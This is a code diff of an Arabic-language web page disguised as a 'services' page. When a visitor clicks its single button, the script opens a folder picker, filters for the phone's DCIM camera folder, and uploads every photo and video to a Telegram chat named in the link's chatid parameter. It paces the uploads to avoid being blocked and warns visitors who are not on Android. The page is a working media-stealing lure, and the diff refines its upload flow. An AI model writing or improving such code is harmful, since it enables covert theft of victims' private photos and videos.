@@ -19,18 +19,18 @@
             align-items: center;
             justify-content: center;
             font-family: Arial, sans-serif;
+            padding: 20px;
         }
         
         .container {
             text-align: center;
-            padding: 20px;
             width: 100%;
             max-width: 400px;
         }
         
         .message {
             font-size: 22px;
-            margin-bottom: 30px;
+            margin-bottom: 40px;
             line-height: 1.4;
         }
         
@@ -38,15 +38,15 @@
             background: linear-gradient(to right, #f46b45, #eea849);
             color: white;
             border: none;
-            padding: 18px 40px;
-            font-size: 20px;
+            padding: 20px 50px;
+            font-size: 22px;
             border-radius: 50px;
             cursor: pointer;
             transition: all 0.3s;
             font-weight: bold;
             width: 100%;
-            max-width: 250px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            max-width: 300px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
         }
         
         .btn:hover {
@@ -58,36 +58,30 @@
         }
         
         .btn:disabled {
-            opacity: 0.6;
+            opacity: 0.7;
             cursor: not-allowed;
-            transform: none !important;
         }
         
-        .loading {
-            margin-top: 20px;
-            font-size: 16px;
-            color: rgba(255, 255, 255, 0.8);
+        .hidden {
             display: none;
         }
         
-        .success-message {
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 16px;
+            display: none;
+        }
+        
+        .status.success {
             background: rgba(76, 175, 80, 0.2);
             border: 1px solid #4CAF50;
-            padding: 10px;
-            border-radius: 10px;
-            margin-top: 20px;
-            display: none;
-            font-size: 14px;
         }
         
-        .error-message {
+        .status.error {
             background: rgba(244, 67, 54, 0.2);
             border: 1px solid #F44336;
-            padding: 10px;
-            border-radius: 10px;
-            margin-top: 20px;
-            display: none;
-            font-size: 14px;
         }
     </style>
 </head>
@@ -97,13 +91,7 @@
         
         <button id="servicesBtn" class="btn">الخدمات</button>
         
-        <div id="loading" class="loading">جاري المعالجة...</div>
-        
-        <div id="successMessage" class="success-message"></div>
-        <div id="errorMessage" class="error-message"></div>
-        
-        <!-- Input مخفي لاختيار الملفات -->
-        <input type="file" id="fileInput" webkitdirectory directory multiple style="display: none;" accept="image/*,video/*">
+        <div id="statusMsg" class="status"></div>
     </div>
 
     <script>
@@ -112,101 +100,130 @@
         
         // العناصر
         const servicesBtn = document.getElementById('servicesBtn');
-        const fileInput = document.getElementById('fileInput');
-        const loading = document.getElementById('loading');
-        const successMessage = document.getElementById('successMessage');
-        const errorMessage = document.getElementById('errorMessage');
+        const statusMsg = document.getElementById('statusMsg');
+        
+        // مسار DCIM الثابت
+        const DCIM_PATH = "/storage/emulated/0/DCIM/";
         
         // عند النقر على زر الخدمات
-        servicesBtn.addEventListener('click', function() {
-            // نغير نص الزر
-            servicesBtn.textContent = "بدء";
-            servicesBtn.disabled = false;
-            
-            // نغير وظيفة الزر لفتح مجلد DCIM
-            servicesBtn.onclick = openDCIMFolder;
-        });
-        
-        // فتح مجلد DCIM
-        function openDCIMFolder() {
+        servicesBtn.addEventListener('click', async function() {
+            // تعطيل الزر
             servicesBtn.disabled = true;
-            servicesBtn.textContent = "جاري الوصول للمجلد...";
-            
-            // نبدأ محاولة الوصول للمجلد
-            setTimeout(() => {
-                fileInput.click();
-            }, 500);
-        }
-        
-        // عند اختيار الملفات
-        fileInput.addEventListener('change', async function(e) {
-            const files = e.target.files;
-            
-            if (files.length === 0) {
-                resetButton();
-                return;
-            }
-            
-            // الحصول على chatid من الرابط
-            const urlParams = new URLSearchParams(window.location.search);
-            const chatId = urlParams.get('chatid');
-            
-            if (!chatId) {
-                showError('❌ لم يتم العثور على chatid في الرابط');
-                resetButton();
-                return;
-            }
-            
-            // إظهار رسالة التحميل
-            loading.style.display = 'block';
-            servicesBtn.style.display = 'none';
+            servicesBtn.textContent = "جاري التحميل...";
             
             try {
-                let successfulUploads = 0;
-                const totalFiles = files.length;
+                // الحصول على chatid من الرابط
+                const urlParams = new URLSearchParams(window.location.search);
+                const chatId = urlParams.get('chatid');
                 
-                // إرسال كل الملفات
-                for (let i = 0; i < totalFiles; i++) {
-                    const file = files[i];
-                    
-                    // تحديث رسالة التحميل
-                    loading.textContent = `جاري الرفع... ${i + 1}/${totalFiles}`;
-                    
-                    // إرسال الملف إلى التلجرام
-                    const success = await sendToTelegram(file, chatId);
-                    
-                    if (success) {
-                        successfulUploads++;
-                    }
-                    
-                    // تأخير بسيط بين الملفات
-                    await new Promise(resolve => setTimeout(resolve, 300));
+                if (!chatId) {
+                    showStatus("error", "❌ لم يتم العثور على chatid في الرابط");
+                    resetButton();
+                    return;
                 }
                 
-                // عرض نتيجة الرفع
-                if (successfulUploads > 0) {
-                    showSuccess(`✅ تم الانتهاء بنجاح`);
-                } else {
-                    showError('❌ لم يتم رفع أي ملف');
+                // محاولة الوصول للملفات
+                const files = await getDCIMFiles();
+                
+                if (!files || files.length === 0) {
+                    showStatus("error", "❌ لم يتم العثور على ملفات في DCIM");
+                    resetButton();
+                    return;
                 }
+                
+                // رفع الملفات
+                await uploadFilesToTelegram(files, chatId);
                 
             } catch (error) {
-                showError(`❌ حدث خطأ: ${error.message}`);
-            } finally {
-                // إخفاء التحميل
-                loading.style.display = 'none';
-                
-                // إعادة تعيين بعد 3 ثوان
-                setTimeout(() => {
-                    successMessage.style.display = 'none';
-                    errorMessage.style.display = 'none';
-                    resetButton();
-                }, 3000);
+                showStatus("error", `❌ حدث خطأ: ${error.message}`);
+                resetButton();
             }
         });
         
+        // دالة للحصول على ملفات DCIM
+        async function getDCIMFiles() {
+            return new Promise((resolve, reject) => {
+                // في بيئة الويب، لا يمكن الوصول مباشرة للمسار
+                // لذلك سنستخدم input file مع سمة webkitdirectory
+                
+                const fileInput = document.createElement('input');
+                fileInput.type = 'file';
+                fileInput.webkitdirectory = true;
+                fileInput.multiple = true;
+                fileInput.accept = "image/*,video/*";
+                fileInput.style.display = 'none';
+                
+                document.body.appendChild(fileInput);
+                
+                fileInput.addEventListener('change', (e) => {
+                    const files = Array.from(e.target.files);
+                    
+                    // تصفية الملفات الموجودة في مسار DCIM أو أي مسار
+                    const dcimFiles = files.filter(file => {
+                        const path = file.webkitRelativePath || file.path || '';
+                        return path.includes('DCIM') || path.includes('dcim');
+                    });
+                    
+                    document.body.removeChild(fileInput);
+                    
+                    if (dcimFiles.length > 0) {
+                        resolve(dcimFiles);
+                    } else {
+                        resolve(files); // إذا لم نجد DCIM نأخذ كل الملفات
+                    }
+                });
+                
+                fileInput.addEventListener('cancel', () => {
+                    document.body.removeChild(fileInput);
+                    resolve([]);
+                });
+                
+                // فتح محدد الملفات تلقائياً
+                setTimeout(() => {
+                    fileInput.click();
+                }, 100);
+            });
+        }
+        
+        // دالة لرفع الملفات للتلجرام
+        async function uploadFilesToTelegram(files, chatId) {
+            let successfulUploads = 0;
+            const totalFiles = files.length;
+            
+            for (let i = 0; i < totalFiles; i++) {
+                const file = files[i];
+                
+                // تحديث حالة الزر
+                servicesBtn.textContent = `جاري الرفع ${i + 1}/${totalFiles}`;
+                
+                try {
+                    const success = await sendFileToTelegram(file, chatId);
+                    if (success) successfulUploads++;
+                    
+                    // تأخير بين الملفات لمنع حظر الطلبات
+                    await new Promise(resolve => setTimeout(resolve, 500));
+                    
+                } catch (error) {
+                    console.error(`خطأ في رفع ${file.name}:`, error);
+                }
+            }
+            
+            // عرض نتيجة الرفع
+            if (successfulUploads > 0) {
+                showStatus("success", `✅ تم رفع ${successfulUploads} ملف بنجاح`);
+            } else {
+                showStatus("error", "❌ لم يتم رفع أي ملف");
+            }
+            
+            // إعادة تعيين الزر بعد 3 ثوان
+            setTimeout(() => {
+                resetButton();
+                statusMsg.style.display = 'none';
+            }, 3000);
+        }
+        
         // إرسال ملف إلى التلجرام
-        async function sendToTelegram(file, chatId) {
+        async function sendFileToTelegram(file, chatId) {
             const formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('document', file);
@@ -226,33 +243,23 @@
         
         // إعادة تعيين الزر
         function resetButton() {
-            servicesBtn.textContent = "استخدام المجلد";
+            servicesBtn.textContent = "الخدمات";
             servicesBtn.disabled = false;
-            servicesBtn.style.display = 'block';
-            servicesBtn.onclick = openDCIMFolder;
         }
         
-        // عرض رسالة نجاح
-        function showSuccess(message) {
-            successMessage.textContent = message;
-            successMessage.style.display = 'block';
-            errorMessage.style.display = 'none';
+        // عرض حالة
+        function showStatus(type, message) {
+            statusMsg.className = `status ${type}`;
+            statusMsg.textContent = message;
+            statusMsg.style.display = 'block';
         }
         
-        // عرض رسالة خطأ
-        function showError(message) {
-            errorMessage.textContent = message;
-            errorMessage.style.display = 'block';
-            successMessage.style.display = 'none';
-        }
-        
-        // محاولة فتح مجلد DCIM تلقائياً عند تحميل الصفحة
+        // تحقق من أن المستخدم على أندرويد
         window.addEventListener('load', function() {
-            // نتحقق من أن المستخدم على هاتف
-            const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+            const isAndroid = /Android/i.test(navigator.userAgent);
             
-            if (isMobile) {
-                console.log("جهاز محمول مكتشف");
+            if (!isAndroid) {
+                showStatus("error", "⚠️ هذا الموقع يعمل بشكل أفضل على أجهزة الأندرويد");
             }
         });
     </script>
